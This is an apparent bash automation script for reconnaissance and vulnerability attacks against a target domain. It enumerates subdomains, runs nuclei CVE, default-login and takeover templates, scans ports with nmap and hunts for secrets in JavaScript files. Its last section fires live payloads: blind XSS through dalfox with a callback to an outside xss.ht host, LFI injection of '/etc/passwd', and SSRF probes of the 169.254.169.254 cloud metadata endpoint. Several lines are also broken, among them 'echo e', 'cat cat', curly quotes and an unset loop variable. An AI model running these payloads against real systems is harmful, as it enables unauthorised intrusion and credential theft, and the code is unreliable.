#!/bin/bash

mkdir  -p $1/{recon,nuclei,jaeles,subtko,waybackurls,js,eyewitness,ports,BLC,clickjack,Dalfox,Directory,Misc}
echo  "***************************************************************************"

echo "Gathering Subdomain"
echo "***************************************************************************"
sleep 15

subfinder -silent -d $1 > $1/recon/Subdomain.txt 
gau -subs $1 | cut -d / -f 3 | cut -d ":" -f 1| sort -u >> $1/recon/Subdomain.txt 
assetfinder -subs-only $1 >> $1/recon/Subdomain.txt 
findomain -t $1 -q -u $1/recon/findomain.txt
for domain in $(cat $1/recon/findomain.txt );do  echo e "\n\n============URL: "$domain"================"; findomain -t $domain -q ;done >> $1/recon/Subdomain.txt 

sleep 15

echo "Sorting Subdomain"
echo "***************************************************************************"
sleep 15

cat $1/recon/Subdomain.txt| sort -u | uniq > $1/recon/Final_subdomain.txt


echo "Testing for Alive Subdomains"
echo "***************************************************************************"
sleep 15
cat $1/recon/Final_subdomain.txt| httpx -silent > $1/recon/ALive.txt


echo "Sending all URLs to Nuclei|Sit Back and Relax"
echo "***************************************************************************"
sleep 15


echo "Testing for CVEs"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/cves/ -silent -c 20 -o $1/nuclei/cve.txt

echo "Testing for Subdomain Takeover"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/takeovers/ -silent -c 20 -o $1/nuclei/subtko.txt


echo "Testing for security misconfiguration"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/misconfiguration/ -silent -c 20 -o $1/nuclei/sec_misconfig.txt

echo "Testing for Files"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/exposures/files/  -silent -c 20 -o $1/nuclei/Files.txt

echo "Testing for Vulnerabilities "
echo "------------------------------------------------------"

nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/vulnerabilities/ -silent -c 20 -o $1/nuclei/Vuln.txt

echo "testing for Default Logins"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/default-logins/ -silent -c 20 -o $1/nuclei/Default.txt

echo "Testing Miscellaneous"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/miscellaneous/ -silent -c 20 -o $1/nuclei/misc.txt

echo "backup Files"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/exposures/backups/ -silent -c 20 -o $1/nuclei/backup.txt

echo "DNS"
echo "------------------------------------------------------"
nuclei -l $1/recon/Final_subdomain.txt -t ~/nuclei-templates/dns/ -silent -c 20 -o $1/nuclei/DNS.txt


echo "Grabbing Screenshots "
echo "***************************************************************************"
cat $1/recon/ALive.txt | aquatone -o $1/screenshot/aquatone

echo "Scanning for Open Ports"
echo "***************************************************************************"   
nmap -sC -sV -iL $1/recon/ALive.txt  -oA $1/ports/nmap

echo "Testing for Subdomain Takeover"
echo "***************************************************************************"
SubOver -l $1/recon/Subdomain.txt -v > $1/subtko/output.txt
sleep 30

echo "let's go way back (Spidering)"
echo "***************************************************************************"
sleep 10
waybackurls $1/recon/ALive.txt |tee $1/waybackurls/wayback.txt
gospider -S $1/recon/ALive.txt -o output -c 10 -d 1 --other-source --include-subs -p http://127.0.0.1:8080 |tee $1/waybackurls/wayback.txt

echo "Analysing Js Files"
echo "***************************************************************************"
cat $1/recon/Subdomain.txt |subjs |grep "js"| sort -u | uniq |tee $1/waybackurls/js.txt
cat $1/waybackurls/js.txt | hakcheckurl | grep "200" |awk '{print $2}'|tee $1/js/js_alive.txt
for url in $(cat $1/waybackurls/js_alive.txt);do echo e "\n\n============URL: "$domain"================"; python3 ~/tools/secretfinder/SecretFinder.py -i $url -o cli;done | tee $1/waybackurls/secretfinder.txt 


echo "Searching for Links"
echo "***************************************************************************"
for domain in $(cat $1/recon/ALive.txt);do echo e "\n\n============URL: "$domain"================";python3 ~/tools/LinkFinder/linkfinder.py -i $domain -o cli;done| tee $1/waybackurls/js_link.txt

echo "Sending to Paramspider"
echo "***************************************************************************"
for domain in $(cat cat $1/recon/ALive.txt);do echo e "\n\n============URL: "$domain"================"; python3 ~/tools/ParamSpider/paramspider.py -d $domain --quiet --level high --exclude woff,css,js,png,svg,php,jpg;done | tee $1/recon/params.txt

echo "Checking For Broken Links"
echo "***************************************************************************"
for domain in $(cat $1/recon/ALive.txt );do echo e "\n\n============URL: "$domain"================"; blc $domain;done |tee $1/BLC/broken_link.txt

echo "Checking For Clickjacking"
echo "***************************************************************************"
sleep 15
python3 ~/tools/clickjack/clickjack.py $1/recon/ALive.txt | grep -v "NOT" | awk '{print $2}' |tee $1/clickjack/vulnerable.txt


echo "Testing for XSS + LFI + SSRF"
echo "***************************************************************************"
cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b h3110mb.xss.ht | tee $1/Dalfox/poc.txt
cat $1/waybackurls/wayback.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' |tee $1/Misc/LFI.txt
cat $1/waybackurls/wayback.txt |qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ |tee $1/Misc/ssrf.txt


echo "Doing DirSearch"
echo "***************************************************************************"
for x in $($1/recon/ALive.txt);do echo e "\n\n============URL: "$domain"================"; ffuf -u $x/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,302;done |tee $1/Directory/$x
